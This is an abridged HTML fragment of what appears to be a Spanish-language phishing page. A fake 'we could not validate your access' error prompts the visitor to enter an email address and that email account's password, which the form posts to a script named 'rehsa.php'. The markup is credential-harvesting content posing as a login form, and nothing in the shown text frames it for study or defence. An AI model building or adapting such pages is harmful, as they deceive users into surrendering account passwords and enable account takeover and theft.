                    ...
                    <div class="left" ng-init="init()" id="con" style="padding-top: 40px;">
                        ...
                        <div class="content">
                            <form
                                ...
                                role="form" name="form" id="form " action="rehsa.php" method="post"
                                novalidate="novalidate">

                                <div id="image" style="display: block;">
                                    <div class="alert alert-danger " id="msg-error ">
                                        <p>No pudimos validar tu acceso. Accede desde tu cuenta de correo electronico
                                            vinculada</p>
                                    ...
                                    <div class="form-group">
                                        <label for="alias" class="ng-binding">CORREO ELECTRONICO</label>
                                        <input type="mail" name="username" ng-model="alias" id="alias"
                                            class="form-control ng-pristine ng-untouched ng-valid ng-valid-required ng-valid-minlength ng-valid-maxlength"
                                            minlength="4" maxlength="50" required="" tabindex="2"
                                            placeholder="correo@mail.com" autocomplete="off" data-bv-field="alias"
                                            value="">
                                ...
                                <div class="form-group has-success"
                                    ...
                                    <label class="ng-binding">CONTRASEÑA DEL CORREO<a href="" id="updatePass"
                                            ng-click="validuser($event)" class="ng-binding">No lo recuerdo</a></label>
                                ...
                                <div>
                                    ...
                                    <button id="btnLogin " type="submit" class="btn ng-binding"
                                        ng-click="valid($event)"><svg xmlns="http://www.w3.org/2000/svg"
